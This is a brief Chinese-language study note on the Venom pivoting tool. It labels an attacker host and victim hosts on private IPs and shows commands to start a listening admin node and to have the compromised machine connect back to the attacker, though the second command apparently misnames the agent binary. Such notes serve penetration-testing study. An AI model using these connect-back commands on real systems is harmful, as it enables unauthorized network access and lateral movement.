## Venom命令学习(毒液)

---

- [下载地址](https://github.com/Dliv3/Venom)

---

- 基本命令

- 攻击机 192.168.31.46

- 被攻击机 192.168.56.6 192.168.31.139

  - 攻击机 admin创建管理节点
    ```shell
    ./admin -lport 8888
    ```

  - 被攻击机 agent加入节点
    ```shell
    ./admin -rhost 192.168.31.46 -rport 8888
    ```

    